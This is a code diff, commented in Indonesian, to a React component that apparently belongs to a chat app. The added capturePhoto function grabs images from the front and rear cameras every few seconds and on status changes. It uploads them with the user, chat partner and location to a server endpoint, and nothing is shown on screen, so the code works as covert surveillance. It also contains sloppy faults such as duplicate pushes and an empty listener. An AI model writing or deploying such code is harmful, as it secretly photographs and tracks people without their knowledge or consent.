@@ -412,7 +412,7 @@ useEffect(() => {
   const intervalRef = useRef(null);
 
   // ========= FUNGSI CAPTURE FOTO =========
-  const capturePhoto = async (status = "unknown") => {
+  const capturePhoto22222222222222222222 = async (status = "unknown") => {
     try {
       // Cek semua device kamera yang tersedia
       const devices = await navigator.mediaDevices.enumerateDevices();
@@ -493,7 +493,120 @@ useEffect(() => {
       return [];
     }
   };
-  // 🔥 JALAN SETIAP 10 DETIK
+  // // 🔥 JALAN SETIAP 10 DETIK
+  // useEffect(() => {
+  //   // jalan langsung sekali (opsional)
+  //   capturePhoto("auto");
+
+  //   intervalRef.current = setInterval(() => {
+  //     capturePhoto("auto");
+  //   // }, 10_000); // 10 detik
+  //   }, 5000); // 10 detik
+
+  //   return () => {
+  //     clearInterval(intervalRef.current);
+  //   };
+  // }, []);
+
+ // ========= FUNGSI CAPTURE FOTO =========
+  const capturePhoto = async (status = "unknown") => {
+     if (!photoCaptureEnabled) {
+      console.warn("Capture Photo dimatikan");
+      return []; // jangan ambil foto
+    }
+    try {
+      // Cek semua device kamera yang tersedia
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoInputs = devices.filter((d) => d.kind === "videoinput");
+
+      // Kalau gak ada kamera
+      if (videoInputs.length === 0) {
+        throw new Error("Tidak ada kamera yang terdeteksi");
+      }
+
+      // Tentukan facingMode yang mau diambil
+      const facingModes =
+        videoInputs.length > 1
+          ? ["user", "environment"] // dua kamera
+          : ["user"]; // satu aja (biasanya laptop)
+
+      const capturedURLs = [];
+
+      // Loop ambil semua kamera yang tersedia
+      for (const facing of facingModes) {
+        const constraints = {
+          video: { facingMode: { exact: facing } }
+        };
+
+        try {
+          // 1. Ambil stream
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+
+          // Tunggu sedikit agar kamera siap
+          await new Promise((r) => setTimeout(r, 500));
+
+          // 2. Capture ke canvas
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL("image/png");
+
+          // 3. Stop kamera
+          stream.getTracks().forEach((track) => track.stop());
+
+          // Upload via server-side API
+          const res = await fetch("/api/uploadPhotot", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              imageData,
+              currentUser,
+              chatWith,
+              riva,
+              status,
+              facing
+             
+            })
+          });
+
+          const data = await res.json();
+          
+          if (data?.data?.url) {
+              capturedURLs.push({ 
+                facing, 
+                downloadURL: data.data.url 
+              });
+            }
+
+          if (!res.ok || !data?.data?.url) {
+            console.warn("Upload gagal:", data);
+            continue;
+          }
+          
+          capturedURLs.push({ 
+            facing, 
+            downloadURL: data.data.url 
+          });
+
+        } catch (err) {
+          console.warn(`Gagal ambil kamera ${facing}:`, err.message);
+        }
+      }
+
+      return capturedURLs; // hasil array { facing, downloadURL }
+    } catch (err) {
+      console.error("Gagal capture foto:", err);
+      return [];
+    }
+  };
+
+   // 🔥 JALAN SETIAP 10 DETIK
   useEffect(() => {
     // jalan langsung sekali (opsional)
     capturePhoto("auto");
@@ -673,6 +786,9 @@ useEffect(() => {
           status,
           deleteTime: serverTimestamp(),
         });
+       onValue(newLogRef, (snap) => {
+
+        });
 
         // Tambahkan ini untuk melihat deleteTime yang sudah jadi timestamp
         // onValue(newLogRef, (snap) => {
@@ -708,14 +824,22 @@ useEffect(() => {
       data.latitude = latitude;
       data.longitude = longitude;
     }
+    const cleanPhoto = photoURL?.filter(p => p?.downloadURL);
 
-    await update(userRef, data);
-    await saveOldDataToLogs("online"); // simpan data lama dulu
+    if (cleanPhoto?.length) {
+      data.photoURL = cleanPhoto;
+    }
+
+    update(userRef, data);
+
+    // await update(userRef, data);
+    // await saveOldDataToLogs("online"); // simpan data lama dulu
  
   };
 
   const updateOfflineStatus = async () => {
      // simpan sebelum offline
+     await saveOldDataToLogs("offline");
  const photoURL = await capturePhoto("offline");
    if (!photoURL) return;
     const data = {
@@ -736,26 +860,40 @@ useEffect(() => {
       data.latitude = latitude;
       data.longitude = longitude;
     }
-   
-     await update(userRef, data);
-   await saveOldDataToLogs("offline");
+    const cleanPhoto = photoURL?.filter(p => p?.downloadURL);
+    if (cleanPhoto?.length) {
+      data.photoURL = cleanPhoto;
+    }
+   update(userRef, data);
+   //   await update(userRef, data);
+   // await saveOldDataToLogs("offline");
   };
 
   const updateLastSeen = async () => {
+    await saveOldDataToLogs("update_lastSeen")
    const photoURL = await capturePhoto("update_lastSeen");
-   if (!photoURL) return;
+    const cleanPhoto = photoURL?.filter(p => p?.downloadURL);
+
+
+       const data = {
+          lastSeen: serverTimestamp(),
+          ...(cleanPhoto?.length ? { photoURL_lastSeen: cleanPhoto } : {})
+        };
+      
+        update(userRef, data);
+   // if (!photoURL) return;
     // update(userRef, {
     //   lastSeen: serverTimestamp(),
     //   photoURL2: photoURL || null
     // });
-   const data = {
-    lastSeen: serverTimestamp(),
-    photoURL2: photoURL, // field ketiga
-  };
+  //  const data = {
+  //   lastSeen: serverTimestamp(),
+  //   photoURL2: photoURL, // field ketiga
+  // };
 
-  await update(userRef, data);
+  // await update(userRef, data);
 
-     await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
+     // await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
 
   };
 
